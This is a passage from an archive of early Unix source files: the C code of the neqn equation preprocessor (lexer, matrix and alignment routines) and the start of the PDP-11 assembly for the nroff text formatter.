	putchar('\0');
	flush();
	exit();
}

getline(s) char *s; {
	char c;
	while((*s++=c=getc())!='\n' && c!='\0' && c!=lefteq );
	if( c==lefteq )
		s--;
	*s++ = '\0';
	return(c);
}

inline() {
	int i,j,ds[20],t;
	i =  -1;
	do{
		if( i>=17 ){
			while((j=getline(in))!='\n' && j!='\0');
			error(!FATAL,"missing right delim (?) at %.20s",in);
			break;
		}
		ds[++i] = oalloc();
		printf(".ds %d \"%s\n", ds[i], in);
		init();
		yyparse();
		if( eqnreg > 0 )
			ds[++i] = eqnreg;
	} while( (t=getline(in)) == lefteq );
	ds[++i] = oalloc();
	printf(".ds %d \"%s", ds[i], in);
	for( j=0; j<=i; j++){
		printf("\\*(%d", ds[j]);
		ofree(ds[j]);
	}
	putchar('\n');
	flush();
}

putout(p1) int p1; {
	if(dbg)printf(".\tanswer <- S%d\n",p1);
	eqnht = eht[p1];
	eqnbase = ebase[p1];
	eqnreg = p1;
}

abs(v) int v; {
	return( v>0 ? v : -v );
}

max(i,j) int i,j; {
	return( i>j ? i : j );
}

oalloc(){
	int i;
	for( i=11; i<100; i++)
		if( used[i]++ == 0 ) return(i);
	error( FATAL, "no strings left", i);
}

ofree(n) int n; {
	used[n] = 0;
}

setfile(argc, argv) int argc; char *argv[]; {
	svargc = --argc;
	svargv = argv;
	while( svargc > 0 && svargv[1][0] == '-'){
		switch( svargv[1][1] ){

		case 'd': lefteq=svargv[1][2]; righteq=svargv[1][3]; break;
		case 's': break;
		case 'f': break;
		default:
			dbg = 1;
			ESCOUT = 'E';
			HFWDOUT = 'F';
			HREVOUT = 'R';
			BKSPOUT = 'B';
			FWDOUT = 'S';
		}
		svargc--;
		svargv++;
	}
	if( svargc == 0 )
		fin = dup(0);
	else if( (fin = open(svargv[1], 0)) < 0)
		error( FATAL,"can't open file %s", argv[1]);
	ptr = 0;
	fout = dup(1);
	ifile = 1;
	linect = 1;
}

yyerror(){;}

int	gsize	10;
int	gfont	'I';

init(){
	ct = 0;
	first++;
}

error(fatal, s1, s2) int fatal; char *s1, *s2; {
	int sfout;
	printf("NEQN ERROR HERE");
	flush(fout);
	sfout = fout;
	fout = 2;
	if( fatal>0 )
		printf("fatal error: ");
	printf(s1,s2);
	printf(" file %s, between lines %d and %d\n",
		 svargv[ifile], eqline, linect);
	flush(2);
	fout = sfout;
	if( fatal > 0 )
		exit(1);
}

down(n) int n; {
	int c;
	if( n<= 0 )
		c = HREVOUT;
	else
		c = HFWDOUT;
	n = abs(n);
	while( n-- > 0 ){
		putchar(ESCOUT); putchar(c);
	}
}

up(n) int n; {
	int c;
	if( n<= 0 )
		c = HFWDOUT;
	else
		c = HREVOUT;
	n = abs(n);
	while( n-- > 0 ){
		putchar(ESCOUT); putchar(HREVOUT);
	}
}

fwd(n) int n; {
	int c,i;
	c = n<0 ? BKSPOUT : FWDOUT;
	n = abs(n);
	while( n-- > 0 )
		putchar(c);
}

back(n) int n; {
	int c,i;
	c = n>0 ? BKSPOUT : FWDOUT;
	n = abs(n);
	while( n-- > 0 )
		putchar(c);
}

line(n) int n; {
	while( n-- > 0 )
		putchar('_');
}
-- /usr/source/s7/ne5.c mode=0100664 uid=3 gid=3 atime=174924324 mtime=169260922 --
#include "ne.h"

int	markpos;

mark(n) int n; {
	if( n )
		markpos = ewid[n];
	else {
		yyval = oalloc();
		printf(".ds %d \"\n", yyval);
		ebase[yyval] = ewid[yyval] = markpos = 0;
		eht[yyval] = 2;
	}
	if(dbg)printf(".\tmark %d as %d\n", n, markpos);
}

lineup(n) int n; {
	if( n ) {
		printf(".ds %d \"", n);
		fwd(markpos-ewid[n]);
		printf("\\*(%d\n", n);
		ewid[n] = markpos;
	}
	else {
		yyval = oalloc();
		printf(".ds %d \"", yyval);
		fwd(markpos);
		printf("\n");
		ebase[yyval] = 0;
		eht[yyval] = 2;
		ewid[yyval] = markpos;
	}
	if(dbg)printf(".\tlineup %d at %d\n", n, markpos);
}
-- /usr/source/s7/ne6.c mode=0100664 uid=3 gid=3 atime=174924331 mtime=169260922 --
#include "ne.h"

column(type, p1, p2) int type, p1, p2; {
	int i, n;
	lp[p1] = ct - p1 - 1;
	if( dbg ){
		printf(".\t%c column of", type);
		for( i=p1+1; i<ct; i++ )
			printf(" S%d", lp[i]);
		printf(", rows=%d\n",lp[p1]);
	}
	lp[ct++] = type;
}

matrix(p1,p2) int p1, p2; {
	int nrow, ncol, i, j, k, hb, b, val[100], db;
	int w;
	char *space;
	space = "\\ \\ ";
	nrow = lp[p1];	/* disaster if rows inconsistent */
	ncol = 0;
	for( i=p1; i<ct; i =+ lp[i]+2 ){
		ncol++;
		if(dbg)printf(".\tcolct=%d\n",lp[i]);
	}
	for( k=1; k<=nrow; k++ ) {
		hb = b = 0;
		j = p1 + k;
		for( i=0; i<ncol; i++ ) {
			hb = max(hb, eht[lp[j]]-ebase[lp[j]]);
			b = max(b, ebase[lp[j]]);
			j =+ nrow + 2;
		}
		if(dbg)printf(".\trow %d: b=%d, hb=%d\n", k, b, hb);
		j = p1 + k;
		for( i=0; i<ncol; i++ ) {
			ebase[lp[j]] = b;
			eht[lp[j]] = b + hb;
			j =+ nrow + 2;
		}
	}
	j = p1;
	w = 0;
	for( i=0; i<ncol; i++ ) {
		lpile(lp[j+lp[j]+1], j+1, j+lp[j]+1);
		val[i] = yyval;
		w =+ ewid[yyval];
		j =+ nrow + 2;
	}
	yyval = oalloc();
	eht[yyval] = eht[val[0]];
	ebase[yyval] = ebase[val[0]];
	ewid[yyval] = w + 2 * (ncol-1);	/* 2 = width(space) */
	if(dbg)printf(".\tmatrix S%d: r=%d, c=%d, h=%d, b=%d, w=%d\n",
		yyval,nrow,ncol,eht[yyval],ebase[yyval], ewid[yyval]);
	printf(".ds %d \"", yyval);
	for( i=0; i<ncol; i++ )  {
		printf("\\*(%d%s", val[i], i==ncol-1 ? "" : space);
		ofree(val[i]);
	}
	printf("\n");
	ct = p1;
}
-- /usr/source/s7/nelex.c mode=0110664 uid=3 gid=3 atime=174924343 mtime=169260922 --
#
#include "ne.h"
#include "y.tab.c"

char *cntrl[] {
	"sup", "super", "sub",
	".EN",
	"sum", "from", "to",
	"hat", "dot", "dotdot", "bar", "tilde", "under",
	"prod", "int", "integral", "union", "inter",
	"pile", "lpile", "cpile", "rpile", "over", "sqrt",
	"above", "size", "font", "roman", "italic", "bold",
	"left", "right",
	"delim", "DELIM",
	"DEFINE","define",
	".gsize", ".GSIZE", "gsize", "GSIZE", "gfont", "GFONT",
	"HAT", "DOT", "DOTDOT", "BAR", "TILDE", "UNDER",
	"PROD", "INT", "INTEGRAL", "UNION", "INTER",
	"SUM", "FROM", "TO",
	"SUP", "SUPER", "SUB", "PILE", "LPILE", "CPILE", "RPILE", "OVER", "SQRT",
	"ABOVE", "SIZE", "FONT", "ROMAN", "ITALIC", "BOLD",
	"LEFT", "RIGHT", 
	"up", "UP", "down", "DOWN", "fwd", "FWD", "back", "BACK",
	"mark", "MARK", "lineup", "LINEUP",
	"matrix", "lcol", "ccol", "rcol", "col",
	0};


int icntrl[]{
	SUPER, SUPER, SUB,
	0, /* EOF */
	SUM, FROM, TO,
	HAT, DOT, DOTDOT, BAR, TILDE, UNDER,
	PROD, INT, INT, UNION, INTER,
	PILE, LPILE, CPILE, RPILE, OVER, SQRT,
	ABOVE, SIZE, FONT, ROMAN, ITALIC, BOLD,
	LEFT, RIGHT,
	DELIM, DELIM,
	DEFINE, DEFINE,
	GSIZE, GSIZE, GSIZE, GSIZE, GFONT, GFONT,
	HAT, DOT, DOTDOT, BAR, TILDE, UNDER,
	PROD, INT, INT, UNION, INTER,
	SUM, FROM, TO,
	SUPER, SUPER, SUB, PILE, LPILE, CPILE, RPILE, OVER, SQRT,
	ABOVE, SIZE, FONT, ROMAN, ITALIC, BOLD,
	LEFT, RIGHT,
	UP, UP, DOWN, DOWN, FWD, FWD, BACK, BACK,
	MARK, MARK, LINEUP, LINEUP,
	MATRIX, LCOL, CCOL, RCOL, COL,
	0};

int	peek	-1;
#define	SSIZE	400
char	token[SSIZE];
int	sp;
int speek[10];
char *swt[10];
int sw -1;

getc(){
  loop:
	if(sw >= 0){
		lastchar = (peek<0) ? *swt[sw]++ : peek;
		peek = -1;
		if(lastchar != '\0')return(lastchar);
		peek = speek[sw--];
		return(' ');
		}
	lastchar = (peek<0) ? getchar() : peek;
	if( lastchar=='\n' )
		linect++;
	peek = -1;
	if( lastchar!= '\0' )
		return(lastchar);
	if( ++ifile > svargc ){
		peek = '\0';
		return('\0');
	}
	close(fin);
	linect = 1;
	if( (fin=open(svargv[ifile],0)) >= 0 )
		goto loop;
	error(FATAL,"can't open file %s\n", svargv[ifile]);
}

yylex(){
	int c, type;
  beg:
	while( (c=getc())==' ' || c=='\n');
	yylval=c;
	switch(c){

	case '\0':
		return('\0');
	case '~':
		return(SPACE);
	case '^':
		return(THIN);
	case '\t':
		return(TAB);
	case '{':
		return(MQ);
	case '}':
		return(MQ1);
	case '"':
		for(sp=0; (c=getc())!='"'; ){
			if(c !='\\')token[sp++]=c;
			else { if((c=getc())!= '"')token[sp++]='\\';
				token[sp++] = c; }
			if( sp>=SSIZE )
				error(FATAL,"quoted string %.20s... too long", token);
		}
		token[sp]='\0';
		yylval= &token[0];
		return(QTEXT);
	}
	if( c==righteq )
		return('\0');

	getstr(token, c);
	if((type = lookup(token,nptr)) >= 0){
		if(sw >= 9)
			error(FATAL,"definitions nested > 9", sw);
		swt[++sw] = sptr[type];
		speek[sw] = peek;
		peek = -1;
		goto beg;
		}
	type = lookup(token,cntrl);
	if( type < 0 )
		return(CONTIG);
	if( icntrl[type]==DEFINE ) {
		define();
		goto beg;
	}
	else if( icntrl[type]==DELIM ) {
		delim();
		goto beg;
	}
	else if( icntrl[type]==GSIZE ){
		globsize();
		goto beg;
	}
	else if( icntrl[type]==GFONT ) {
		globfont();
		goto beg;
	}
	else
		return( icntrl[type] );
}

getstr(s,c) char *s, c; {
	for (sp=0; c!=' ' && c!='\t' && c!='\n' && c!='{' && c!='}'
		&& c!='"' && c!='~' && c!='^' && c!=righteq; ) {
		if(c == '\\') if((c = getc()) != '"')s[sp++] = '\\';
		s[sp++] = c;
		if( sp>=SSIZE )
			error(FATAL,"token %.20s... too long",s);
		c = getc();
		}
	if( c=='{' || c=='}' || c=='"' || c=='~' || c=='^' || c=='\t' || c==righteq )
		peek = c;
	s[sp]='\0';
	yylval = s;
}

lookup(str,tbl) char *str; char *tbl[]; {
	register i,j, r;
	for(i=0; tbl[i]!=0; i++){ /* table of tbl wds */
		for( j=0; (r=tbl[i][j])==str[j] && r!='\0'; j++);
		if( r == str[j] )
			return(i);
	}
	return( -1 );
}

cstr(s,quote) char *s; int quote; {
	int del,c,i;
	while((del=getc()) == ' ' || del == '\t' || del == '\n');
	if(quote)
		for(i=0; (c=getc()) != del;)
			s[i++] = c;
	else {
		s[0] = del;
		for(i=1; (c=getc())!=' ' && c!= '\t' && c!='\n';)
			s[i++]=c;
	}
	s[i] = '\0';
	return(s);
}

define() {
	char *alloc();
	int i, c;
	while( (c=getc())==' ' || c=='\n' );
	getstr(token,c);
	if((i = lookup(token,nptr)) >= 0){
		yyval = i;
		free(sptr[yyval]);
	} else {
		yyval = ptr++;
		for(i=0; token[i] != '\0'; i++);
		nptr[yyval] = alloc(i+1);
		for(i=0; nptr[yyval][i]=token[i]; i++);
	}
	if(dbg)printf(".\tdefine %s\n",nptr[yyval]);
	cstr(token,1);
	for(i=0; token[i] != '\0'; i++);
	sptr[yyval] = alloc(i+1);
	for(i=0; sptr[yyval][i] = token[i]; i++);
	if(dbg)printf(".\tname %s defined as %s\n",nptr[yyval],sptr[yyval]);
}

delim() {
	char *s;
	yyval = eqnreg = 0;
	cstr(token,0);
	lefteq = token[0];
	righteq = token[1];
	if( (lefteq == 'o' && righteq == 'f') || (lefteq == 'O' && righteq == 'F') )
		lefteq = righteq = '\0';
}

globsize() {
	extern int gsize;
	int c;
	while( (c=getc())==' ' || c=='\n' );
	getstr(token,c);
	gsize = numb(token);
	yyval = eqnreg = 0;
}

globfont() {
	extern int gfont;
	while( (gfont=getc())==' ' || gfont=='\n' );
	yyval = eqnreg = 0;
}
-- /usr/source/s7/nroff1.s mode=0110664 uid=3 gid=3 atime=174924233 mtime=174845677 --
/
/

/ nroff1 -- text formatter

/	rts = 104000
	signal = 48.
	nop = 000240

	jmp	ibuf
.data
ibuf: /init code in ibuf+obuf
	cmp	sp,$end
	bhi	1f
	jsr	r5,string; emes1
	sys	exit
1:
	clr	r0
	jsr	pc,ttyn
	cmpb	r0,$'x
	bne	0f
	inc	iflg
	mov	$1,r0
	jsr	pc,ttyn
0:
	movb	r0,ttyx+8
	clr	r0
	jsr	pc,mesg
	sys	open; ttyx; 2
	bes	0f
	mov	r0,ttyid
	mov	r0,ttyod
0:
	mov	ttyid,r0
	sys	gtty; ttys
	sys	signal; 1; place
	sys	signal; 2; place
	bit	$1,r0
	beq	0f
	sys	signal; 2; 1	/no deletes
	sys	signal; 3; 1	/no quits
	sys	signal; 1; 1	/allow hangup
0:
	mov	$'%,rlist
	mov	$"nl,rlist+2
	mov	$"dn,rlist+4
	mov	$"yr,rlist+6
	mov	$"mo,rlist+8.
	mov	$"dy,rlist+10.
	mov	$"dw,rlist+12.
	mov	$"hp,rlist+14.
	mov	sp,r0
	jsr	pc,makebf
	sys	open; suffil; 0
	bes	1f
	mov	r0,suff
	sys	seek; 20; 0
	bes	1f
	mov	suff,r0
	sys	read; suftab; 2*26.
1:
	clr	r0
	mov	(sp)+,argc
	dec	argc
	ble	4f
1:
	tst	(sp)+
	mov	(sp),r4
	cmpb	(r4)+,$'+
	bne	2f
	jsr	r5,pnum; pfrom
	br	3f
2:
	cmpb	-1(r4),$'-
	bne	2f
	tstb	(r4)
	beq	4f
	cmpb	(r4),$'m
	bne	0f
	mov	$nextf1,r0
	tstb	(r4)+
8:
	movb	(r4)+,(r0)+
	bne	8b
	inc	nx
	inc	mflg
	br	3f
0:
	cmpb	(r4),$'r
	bne	0f
	tstb	(r4)+
	movb	(r4)+,r0
	beq	3f
	jsr	pc,findr
	mov	r1,-(sp)
	mov	r4,ibufp
	mov	$-1,eibuf
	jsr	pc,atoi
	mov	(sp)+,r1
	mov	r0,(r1)
	clr	ch
	br	3f
0:
	cmpb	(r4),$'s
	bne	0f
	inc	stop
	br	3f
0:
	cmpb	(r4),$'o
	bne	0f
	inc	old
	br	3f
0:
	cmpb	(r4),$'i
	bne	0f
	inc	stdi
	br	3f
0:
	cmpb	(r4),$'q
	bne	0f
	inc	quiet
	br	3f
0:
	cmpb	(r4),$'h
	bne	0f
	clr	slow
	br	3f
0:
	cmpb	(r4),$'n
	bne	0f
	inc	r4
	jsr	r5,pnum; npn
	br	3f
0:
	jsr	r5,pnum; pto
3:
	dec	argc
	bgt	1b
2:
4:
/	tst	index
/	beq	1f
/	sys	creat; indf; 666
/	mov	r0,indid
1:
/	mov	$nop,get1a
	clr	init
	mov	$ibuf,ibufp
	mov	$ibuf,eibuf
	mov	sp,argp
	clr	r0
1:
	movb	r0,trtab(r0)
	inc	r0
	cmp	r0,$128.
	bne	1b
	movb	$040,trtab+014
	mov	sp,ssp
	mov	$70.,vlist+6
	jsr	pc,ctime
	mov	$-1,nl
	mov	$end,enda
	clr	ioff
	jmp	loop
makebf:
	tst	(r0)+
	mov	(r0),r0
	cmpb	(r0),$'a
	bne	0f
	mov	$bfn1,r0
	mov	r0,7f
	mov	r0,8f
	mov	r0,9f
/	mov	r0,place1
0:
	sys	stat; 8:bfn; stbuf
	bec	2f
	sys	creat; 9:bfn; 600
	bec	1f
2:
	incb	bfn1+3
	cmpb	bfn1+3,$'z
	blos	0b
	jmp	place
1:
	mov	r0,ibf
	mov	$blockend,r0
	sub	$block,r0
	cmp	r0,$1024.
	blos	1f
	4
1:
	mov	r0,blocksize
	clr	-(sp)
2:
	mov	ibf,r0
	sys	write; block; 1024.
	inc	(sp)
	cmp	(sp),nev
	ble	2b

	mov	(sp)+,r3
	mpy	$1024.,r3
	mov	r3,nextb
	mov	r3,first
	mov	ibf,r0
	sys	close
	sys	open; 7:bfn; 2
	jes	place
	mov	r0,ibf
	mov	r0,ibf1
	cmp	$bfn1,7b
	beq	1f
	sys	unlink; bfn
1:
	rts	pc

ctime:
	sys	time
	sub	$18000.,r1 /5hrs for est
	sbc	r0
	ashc	$-2,r0
	div	$21600.,r0
	inc	r0
	mov	r0,dy
/	mov	r1,fd
	add	$3,r0
	mov	r0,r1
	sxt	r0
	div	$7,r0
	inc	r1
	mov	r1,dw
3:
	mov	yr,r1
	sxt	r0
	div	$4,r0
	mov	$28.,ms+2
	tst	r1
	bne	0f
	mov	$29.,ms+2
0:
	clr	r0
1:
	cmp	dy,ms(r0)
	ble	2f
	sub	ms(r0),dy
	tst	(r0)+
	cmp	r0,$24.
	blt	1b
	inc	yr
	mov	yr,r1
	br	3b
2:
	asr	r0
	inc	r0
	mov	r0,mo
	rts	pc
ms: 31.;28.;31.;30.;31.;30.;31.;31.;30.;31.;30.;31.

pnum:
	clr	-(sp)
	clr	r3
1:
	movb	(r4)+,r0
	sub	$'0,r0
	cmp	r0,$9
	bhi	1f
	inc	(sp)
	mpy	$10.,r3
	add	r0,r3
	br	1b
1:
	mov	r3,r0
	tst	(sp)+
	beq	2f
	mov	r0,*(r5)+
1:
	rts	r5
2:
	tst	(r5)+
	br	1b

emes1: <Too many files.\n\0>
.even
obuf=ibuf+512.
.=ibuf+1024.
.text
loop:
	clr	nlflg
	clr	nflush
	clr	nb
	mov	ilistp,r1
	jsr	pc,getch1
	mov	r0,ch
	cmp	ilistp,r1
	beq	1f
	tst	ejf
	beq	1f
	cmp	ilistp,ejl
	bhi	1f
	mov	ilistp,ejl
	inc	nflush
	jsr	pc,newline
	br	loop
1:
	jsr	pc,getchar
	tst	pendt
	bne	0f
	tst	lit
	ble	1f
	cmp	frame,litlev
	bhi	1f
	dec	lit
	br	0f
1:
	cmpb	r0,cc
	beq	3f
	cmpb	r0,c2
	beq	2f
	cmpb	r0,tch
	beq	4f
	cmpb	r0,$002
	beq	6f
0:
	movb	r0,ch
	jsr	pc,text
	br	loop
4:
	inc	tflg
	inc	copyf
0:
	jsr	pc,getchar
	mov	r0,r5
	jsr	pc,putchar
	cmp	r5,$'\n
	bne	0b
	clr	tflg
	clr	copyf
	br	loop
2:
	inc	nb
3:
	jsr	pc,control
5:
	jsr	pc,flushi
	br	loop
6:
	inc	raw
	jsr	pc,get1
	movb	r0,xpc
	clr	nlflg
0:
	jsr	pc,get1
	cmpb	r0,xpc
	beq	7f
	jsr	pc,pchar2
	br	0b
7:
	clr	raw
	jbr	loop

mesg:
	tst	r0
	bne	setsame
	sys	stat; ttyx; stbuf
	mov	stbuf+4,0f
	mov	0f,1f
	bic	$22,0f
	sys	0;7f
.data
7:	sys	chmod; ttyx; 0:..
.text
	rts	pc
setsame:
	sys	0;7f
.data
7:	sys	chmod; ttyx; 1:..
.text
	rts	pc

stringfl:
	jsr	pc,flush
string:
	mov	r0,-(sp)
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	(r5)+,r1
	mov	r1,r2
	mov	r1,9f
1:
	tstb	(r1)+
	bne	1b
	dec	r1
	sub	r2,r1
	mov	r1,1f
	mov	ttyod,r0
	cmp	r0,ibf
	beq	2f
0:
	sys	0;7f
.data
7:	sys	write; 9:..; 1:..
.text
	bes	2f
1:
	mov	(sp)+,r2
	mov	(sp)+,r1
	mov	(sp)+,r0
	rts	r5
2:
	sys	creat; tmfile; 666
	bes	1b
	mov	r0,ttyod
	br	0b

flushi:
	tst	nflush
	bne	1f
	clr	ch
	tst	nlflg
	bne	1f
	tst	donef
	beq	2f
	cmp	$ilist,ilistp
	beq	1f
2:
	jsr	pc,getchar
	br	flushi
1:
	rts	pc

gettchar:
	tst	ul
	ble	getchar
	tst	ulstate
	beq	3f
	tst	bsc
	bgt	1f
	tst	ulc
	bgt	2f
	clr	ulstate
	br	3f
1:
	dec	bsc
	mov	$010,r0
	rts	pc
2:
	dec	ulc
	mov	$'_,r0
	rts	pc
3:
	jsr	pc,getchar
	cmp	r0,$016
	beq	4f
	cmp	r0,$017
	beq	4f
	cmp	r0,$'0
	blt	1f
	cmp	r0,$'9
	ble	2f
	cmp	r0,$'A
	blt	1f
	cmp	r0,$'Z
	ble	2f
	cmp	r0,$'a
	blt	1f
	cmp	r0,$'z
	ble	2f
1:
	tst	ulc
	ble	4f
3:
	mov	$1,ulstate
	mov	r0,ch
	br	gettchar
2:
	inc	bsc
	inc	ulc
4:
	tst	r0
	rts	pc

rtnch:
	mov	ch,r0
	clr	ch
	tst	r0
	rts	pc

getchar:
	mov	r1,-(sp)
1:
	jsr	pc,getch1
	bmi	2f
	cmpb	r0,fc
	bne	2f
	tst	copyf
	bne	2f
	jsr	pc,setfield
	br	1b
2:
	mov	(sp)+,r1
	tst	r0
	rts	pc
getch1:
	tst	ch
	bne	rtnch
	mov	r1,-(sp)
1:
	jsr	pc,getch0
	bmi	2f
	tst	copyf
	bne	2f
	cmpb	r0,$030 /\w
	bne	2f
	jsr	r5,setwd;getch0
	br	1b
2:
	jsr	pc,width
	add	r1,column
	mov	(sp)+,r1
	tst	r0
	rts	pc

getch0:
	tst	ch
	bne	rtnch
1:
	tst	nlflg
	beq	1f
	mov	$'\n,r0
	rts	pc
1:
	mov	r1,-(sp)
1:
	jsr	pc,get1
	cmpb	r0,eschar
	bne	2f
	jsr	pc,get1
	jsr	r5,switch; esctab
	cmpb	r0,$'\n
	bne	3f
/	clr	column
	br	1b
2:
	cmp	r0,$033  /prefix
	bne	3f
	jsr	pc,get1
	jsr	r5,switch; pfxtab
3:
	cmpb	r0,$376 /comment
	bne	2f
0:
	jsr	pc,get1
	bmi	0b
	cmpb	r0,$012
	bne	0b
2:
	cmpb	numc,r0
	bne	2f
	clr	r1
	jsr	pc,setn
	br	1b
2:
	cmpb	r0,$372	/mark hor place
	bne	2f
	tst	copyf
	bne	2f
	mov	r0,r1
	jsr	pc,setn
	jsr	pc,findr
	jeq	1b
	mov	column,(r1)
	jbr	1b
2:
	cmpb	r0,$025	/text string
	bne	2f
	jsr	pc,setstr
	br	1b
2:
	cmpb	dolc,r0
	bne	2f
	jsr	pc,seta
	br	1b
2:
	cmpb	r0,$026 /font indicator
	bne	2f
	jsr	pc,get1
	br	1b
2:
	cmpb	r0,$027 /point size
	bne	2f
	jsr	pc,eatps
	br	1b
2:
	cmpb	r0,$021 /spead line
	bne	2f
	tst	copyf
	bne	2f
	inc	spread
	br	1b
2:
	cmpb	r0,$006 /repeat
	bne	2f
	jsr	pc,setrpt
	br	1b
2:
	cmp	r0,$'\n
	bne	3f
	inc	nlflg
	clr	column
	tst	ip
	bne	3f
	inc	iline
3:
	mov	(sp)+,r1
	tst	r0
	rts	pc

eatps:
	jsr	pc,get1
	cmpb	r0,$'+
	beq	0f
	cmpb	r0,$'-
	beq	0f
	sub	$'0,r0
	ble	1f
	cmp	r0,$3
	bgt	1f
0:
	jsr	pc,get1
1:
	rts	pc

.data
esctab:
.byte '*, 025  /text string
.byte 'n, 034  /number char
.byte '$, 020  /dollar char
eschar:
.byte '\\, 134 /backslash
.byte 'e,  013 /printable escape char
.byte 'f, 026  /font indicator
.byte 's, 027  /point size
.byte '&, 037 /filler
.byte 't, 011  /hor tab
.byte '!, 024  /transparent char
.byte 'p, 021  /spread line
.byte 'c, 005 /interrupted text
.byte 'k, 372 /mk hor
/ 014 hidden tab replacement character
.byte ' , 014 /\(space)
.byte 'x, 016  /SO (extra chars)
.byte 'y, 017  /SI (normal characters)
.byte 'l, 0177 /delete
.byte 'd, 032  /hlf (down)
.byte 'u, 035  /hlr (up)
.byte 'r, 036  /flr (reverse)
.byte 'a, 001  /leader char
.byte ':, 003 /lem char
.byte '?, 002 /raw trans
.byte '", 376 /comment
.byte 'w, 030  /width size char
.byte 0, 0
.text

pfxtab:
   .byte '7, 036  /flr
   .byte '8, 035  /hlr
   .byte '9, 032  /hlf
   .byte '1, 026  /set hor tabs
   .byte '2, 027  /clr hor tabs
   .byte 0,0
pfxtab1:

switch:
	mov	r1,-(sp)
	mov	(r5)+,r1
1:
	cmpb	(r1)+,r0
	beq	1f
	tstb	(r1)+
	bne	1b
	cmp	r1,$pfxtab
	ble	0f
	cmp	r1,$pfxtab1
	bgt	0f
	mov	$037,r0
0:
	mov	(sp)+,r1
	rts	r5
1:
	movb	(r1)+,r0
	mov	(sp)+,r1
	rts	r5

get1:
	tst	nspace
	ble	1f
	dec	nspace
	mov	rchar,r0
	rts	pc
1:
	mov	r1,-(sp)
4:
	tst	cp
	beq	2f
	movb	*cp,r0
	bne	1f
	clr	cp
	br	4b
1:
	inc	cp
	br	8f
2:
	tst	ap
	beq	2f
	movb	*ap,r0
	bne	1f
	clr	ap
	br	4b
1:
	inc	ap
	br	8f
2:
	cmp	$-1,ip
	bne	1f
	jsr	pc,rdtty
	br	8f
1:
	tst	ip
	beq	5f
	jsr	pc,rbf
	br	8f
5:
	tst	donef
	beq	0f
	jmp	done
0:
	tst	nx
	bne	0f
3:
	mov	ibufp,r1
	cmp	r1,eibuf
	bne	3f
	cmp	r1,$-1
	beq	3f
0:
	tst	nfo
	bne	2f
1:
	jsr	pc,nextfile
	bne	3b
2:
	clr	nx
	mov	ifile,r0
	sys	read; ibuf; 512.
	bes	1b
	tst	r0
	beq	1b
	mov	$ibuf,r1
	add	r1,r0
	mov	r0,eibuf
3:
	movb	(r1)+,r0
	bic	$!377,r0
	inc	ioff
	mov	r1,ibufp
	tst	raw
	bne	6f
	cmpb	r0,$040
	bhis	8f
	mov	r0,-(sp)
	mov	cbits,r0
	mov	cbits+2,r1
	ashc	(sp),r0
	bmi	0f
	clr	(sp)
0:
	mov	(sp)+,r0
8:
	tst	raw1
	bne	6f
	cmp	r0,$004
	beq	4b
	tst	copyf
	bne	6f
	cmpb	r0,$011	/tab
	bne	0f
	mov	tabc,rchar
	br	1f
0:
	cmpb	r0,$001
	bne	6f
	mov	dotc,rchar
1:
	cmpb	r0,fc
	beq	6f
	cmpb	r0,padc
	beq	6f
	mov	(sp)+,r1
	mov	$tabtab,r0
	inc	nspace
1:
	tst	(r0)
	jeq	get1
	cmp	column,(r0)+
	bge	1b
	mov	-(r0),nspace
	sub	column,nspace
	jbr	get1
6:
/get1a:	br	7f
	tst	init
	bne	7f
	tst	r0
	jeq	4b
7:
	mov	(sp)+,r1
	tst	r0
	rts	pc
cbits: 040743;20 /001,007-012,033 (soh,bel,bs,tab,nl,so,si,esc)
/cbits: 041743;20 /001,006-012,033 (soh,ack,bel,bs,tab,nl,so,si,esc)

edone:
	mov	$stk,frame
	clr	ip
done:
	clr	app
	clr	ds
	mov	em,r0
	beq	0f
	clr	em
	mov	pc,donef
	mov	frame,-(sp)
	jsr	pc,cont1
	cmp	(sp)+,frame
	bne	1f
0:
	tst	nfo
	beq	3f
	clr	op
	clr	mflg
	tst	woff
	beq	0f
	clr	r0
	jsr	pc,wbt
0:
	clr	pendnf
	tst	pendw
	beq	0f
	clr	*pendw
	clr	pendw
0:
	cmp	$1,donef
	beq	done1
	mov	$1,donef
	clr	ip
	mov	$ilist,ilistp
	jsr	pc,rbreak
	inc	nflush
	mov	$ilist,r0
	jsr	pc,eject
1:
	mov	ssp,sp
	jmp	loop
done1:
/	tst	pendb
/	bne	0b
	tst	nl
	beq	1f
	jsr	pc,newline
	br	1b
1:
3:
done2:
	jsr	pc,flush
place:
	sys	signal; 2; 1
	tst	quiet
	beq	1f
	bis	$10,ttym
	mov	ttyid,r0
	sys	stty; ttys
1:
	mov	$1,r0
	jsr	pc,mesg
	mov	outid,r0
	sys	close
	sys	wait
	sys	exit

nextfile:
	mov	ifile,r0
	beq	1f
	sys	close
1:
	tst	nx
	beq	2f
	mov	$nextf,r0
	br	3f
2:
	cmp	ifp,$ifl
	beq	1f
	jsr	pc,popf
	bne	nextfile
	tst	pc
	rts	pc
1:
	dec	argc
	blt	4f
	mov	*argp,r0
	add	$2,argp
3:
	mov	r0,5f
	cmpb	(r0)+,$'-
	bne	0f
	tstb	(r0)
	bne	0f
	clr	r0
	br	1f
0:
	sys	0;7f
.data
7:	sys	open; 5:..; 0
.text
	bec	1f
	sub	mflg,nfo
	jgt	done
	jsr	r5,string; omes
	mov	5b,8f
	jmp	7f
.data
7:	jsr	r5,string; 8:..
	jmp	6f
.text
6:
	jsr	r5,string; 9f
	jbr	done
1:
	clr	iline
	inc	nfo
	mov	r0,ifile
	clr	ioff
	rts	pc
4:
	sub	mflg,nfo
	beq	0f
	tst	stdi
	jeq	done
0:
	clr	iline
	clr	mflg
	inc	nfo
	clr	stdi
	clr	ifile
	clr	ioff
	rts	pc
omes: <Cannot open: \0>
9: <\n\0>
.even

popf:
	clr	-(sp)
	mov	ifp,r1
	cmp	r1,$ifl
	beq	1f
	sub	$2,ifp
	mov	-(r1),ifile
	mov	[offl-ifl](r1),ioff
	mov	ioff,0f
	bic	$777,0f
	mov	ifile,r0
	beq	4f
	sys	0;7f
.data
7:	sys	seek; 0:..; 0
.text
	bes	2f
	mov	ifile,r0
	sys	read; ibuf; 512.
	bes	2f
	add	$ibuf,r0
	mov	r0,eibuf
	sub	ioff,0b
	mov	$ibuf,ibufp
	mov	ifile,r0
	jsr	pc,ttyn
	cmpb	r0,$'x
	bne	1f
	sub	0b,ibufp
	cmp	ibufp,eibuf
	blo	1f
2:
	inc	(sp)
1:
	tst	(sp)+
	rts	pc
4:
	jsr	pc,restbuf
	br	1b

savebuf:
	mov	$ibuf,r0
	mov	$xbuf,r1
	mov	ibufp,xbufp
	mov	eibuf,xeibuf
1:
	mov	(r0)+,(r1)+
